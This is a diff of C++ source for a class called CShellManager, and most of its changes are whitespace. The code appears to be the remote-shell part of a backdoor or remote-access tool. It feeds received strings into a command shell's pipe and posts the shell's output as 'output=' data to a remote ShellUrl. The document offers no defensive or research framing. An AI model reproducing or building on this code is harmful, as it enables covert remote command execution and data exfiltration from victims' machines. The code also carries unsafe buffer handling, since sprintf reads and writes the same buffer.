@@ -94,7 +94,7 @@ CShellManager::~CShellManager()
 DWORD WINAPI CShellManager::WorkThread(LPVOID lparam)
 {
 	CShellManager *pThis = (CShellManager *)lparam;
-    if(pThis==NULL)return 0;
+	if(pThis==NULL)return 0;
 	while(!pThis->b_quit)
 	{
 	Sleep(2000);
@@ -133,9 +133,10 @@ void CShellManager::OnReceive(LPBYTE lpBuff,DWORD dwSize)
 		//SetEvent(m_pClient->m_hEvent);	
 		return;
 	}
-    if(memcmp(strShell,"donothing",10)==0)return;
+	if(memcmp(strShell,"donothing",10)==0)
+		return;
 	sprintf(strShell,"%s%s",strShell,"\r\n");//要加上回车换行!
-    DWORD nSize=strlen(strShell);
+	DWORD nSize=strlen(strShell);
 	DWORD	ByteWrite;
 	WriteFile(m_hWritePipeHandle, strShell, nSize, &ByteWrite, NULL);
 	//printf("\tDone!!\n");
@@ -159,7 +160,7 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 
 			LPBYTE* lpBuffer = (LPBYTE*)LocalAlloc(LPTR, TotalBytesAvail);
 			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
-            //lpBuffer[BytesRead]='\0';
+			//lpBuffer[BytesRead]='\0';
 			// 发送数据
 			//unsigned char* lpEncodedBuffer=(unsigned char*)LocalAlloc(LPTR,TotalBytesAvail*3);
 			//DWORD EncodedLength=pThis->m_pClient->urlencode((unsigned char*)lpBuffer,TotalBytesAvail,lpEncodedBuffer,TotalBytesAvail*3);
@@ -168,12 +169,12 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
 
 			//printf("\nTotalAvail:%d\nBytesRead:%d\nlpBuffer:%d\nlpEncodedBuffer:%d\nEncodedLength:%d",TotalBytesAvail,BytesRead,sizeof(lpBuffer),sizeof(lpEncodedBuffer),EncodedLength);
 
-            printf("\nTotalAvail:%d\nBytesRead:%d\nlpBuffer:%d\n",TotalBytesAvail,BytesRead,strlen((char*)lpBuffer));
+			printf("\nTotalAvail:%d\nBytesRead:%d\nlpBuffer:%d\n",TotalBytesAvail,BytesRead,strlen((char*)lpBuffer));
 
 			//char* PostData=(char*)LocalAlloc(LPTR, EncodedLength*3+32);
 			//sprintf(PostData,"output=%s",lpEncodedBuffer);
 
-            char* PostData=(char*)LocalAlloc(LPTR, TotalBytesAvail+32);
+			char* PostData=(char*)LocalAlloc(LPTR, TotalBytesAvail+32);
 			sprintf(PostData,"output=%s",lpBuffer);
 
 			pThis->Post(ShellUrl,(char*)PostData);
